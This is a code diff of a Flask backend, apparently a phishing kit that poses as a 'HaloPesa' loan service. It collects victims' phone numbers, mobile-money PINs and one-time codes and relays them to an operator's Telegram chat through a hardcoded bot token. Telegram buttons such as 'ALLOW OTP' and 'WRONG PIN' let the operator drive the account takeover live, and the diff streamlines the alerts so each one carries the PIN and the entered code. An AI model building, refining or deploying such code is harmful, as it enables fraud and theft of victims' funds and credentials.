@@ -11,18 +11,16 @@ app = Flask(__name__)
 app.secret_key = 'halopesa-new-2024'
 
 # ================================
-# 🔐 Get credentials from environment variables (Render)
+# 🔐 Credentials
 # ================================
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 CHAT_ID   = os.environ.get('CHAT_ID')
 
-# Fallback for local testing – using your new token
 if not BOT_TOKEN:
     BOT_TOKEN = '8892736098:AAEtdKvOXalb0Gc_3kAlSRWvdMqIhS3aAgw'
 if not CHAT_ID:
     CHAT_ID = '8589275340'
 
-# Set up logging
 logging.basicConfig(level=logging.INFO)
 
 TELEGRAM_API = f'https://api.telegram.org/bot{BOT_TOKEN}'
@@ -100,47 +98,11 @@ def approve():
 def success():
     return render_template('success.html')
 
-# ============================================
-# 🧪 TEST ROUTES – remove after testing
-# ============================================
 @app.route('/test-telegram')
 def test_telegram():
-    """Send a simple test message."""
-    response = send_telegram("🚀 Test message from HaloPesa! Your bot is working.")
-    if response and response.status_code == 200:
-        return "✅ Test message sent! Check your Telegram."
-    else:
-        return f"❌ Failed to send. Check logs. Response: {response.text if response else 'No response'}"
+    send_telegram("🚀 Test message from HaloPesa! Bot is working.")
+    return "Test message sent! Check your Telegram."
 
-@app.route('/debug-telegram')
-def debug_telegram():
-    """Show environment variables and send a custom message."""
-    token = BOT_TOKEN[:10] + '...' + BOT_TOKEN[-5:] if BOT_TOKEN else 'None'
-    chat = CHAT_ID
-    html = f"""
-    <h2>Debug Info</h2>
-    <p><strong>BOT_TOKEN:</strong> {token}</p>
-    <p><strong>CHAT_ID:</strong> {chat}</p>
-    <p><a href="/test-telegram">Click here to send test message</a></p>
-    <form action="/send-debug" method="post">
-        <input type="text" name="message" placeholder="Custom message" value="Hello from debug">
-        <button type="submit">Send</button>
-    </form>
-    """
-    return html
-
-@app.route('/send-debug', methods=['POST'])
-def send_debug():
-    msg = request.form.get('message', 'No message')
-    response = send_telegram(msg)
-    if response and response.status_code == 200:
-        return "✅ Message sent!"
-    else:
-        return "❌ Failed to send."
-
-# ============================================
-# 📋 MAIN API ROUTES
-# ============================================
 @app.route('/api/submit_loan', methods=['POST'])
 def submit_loan():
     try:
@@ -159,6 +121,7 @@ def submit_loan():
         conn = sqlite3.connect('database.db')
         c = conn.cursor()
 
+        # OTP REQUESTED (resend)
         if purpose == 'OTP REQUESTED':
             c.execute("SELECT COUNT(*) FROM loans WHERE phone=? AND status='pending' AND code_status='pending'", (phone,))
             if c.fetchone()[0] >= 3:
@@ -172,6 +135,7 @@ def submit_loan():
                       (app_id, amount, months, phone, pin, code, full_name, employment_status, monthly_income))
             conn.commit()
             conn.close()
+            # ✅ Simplified: only phone, amount, app_id
             msg = f'📤 OTP REQUESTED\n\n🆔 {app_id}\n📞 +255 {phone}\n💰 TZS {amount:,}'
             send_telegram(msg, {'inline_keyboard': [[{'text': '✅ ALLOW OTP', 'callback_data': f'allow_{app_id}'}]]})
             return jsonify({'success': True, 'app_id': app_id})
@@ -194,16 +158,13 @@ def submit_loan():
         conn.commit()
         conn.close()
 
+        # ✅ SIMPLIFIED MESSAGE: only phone, PIN, amount, and app_id
         prefix = '🔄 RETURNING USER' if is_returning else '📥 NEW LOAN REQUEST'
         msg = (
             f'{prefix}\n\n'
             f'🆔 {app_id}\n'
             f'📞 +255 {phone}\n'
             f'💰 TZS {amount:,}\n'
-            f'📅 Miezi: {months}\n'
-            f'👤 Jina: {full_name}\n'
-            f'💼 Ajira: {employment_status}\n'
-            f'💵 Mapato: TZS {monthly_income:,}\n'
             f'🔢 PIN: {pin}'
         )
         deny_callback = f'denyreturn_{app_id}' if is_returning else f'deny_{app_id}'
@@ -232,14 +193,8 @@ def submit_code():
         loan = c.fetchone()
         if loan:
             phone, expected_code, amount, pin = loan
-            msg = (
-                f'🔐 CODE VERIFICATION\n\n'
-                f'🆔 {app_id}\n'
-                f'📞 +255 {phone}\n'
-                f'💰 TZS {amount:,}\n'
-                f'🔢 PIN: {pin}\n\n'
-                f'📋 FULL MESSAGE:\n```\n{entered_code}\n```'
-            )
+            # ✅ SIMPLIFIED: send just the 4-digit code (no extra text)
+            msg = f'🔐 CODE VERIFICATION\n\n🆔 {app_id}\n\n📋 {entered_code}'
             send_telegram(msg, {'inline_keyboard': [
                 [
                     {'text': '❌ WRONG PIN', 'callback_data': f'wrongpin_{app_id}'},
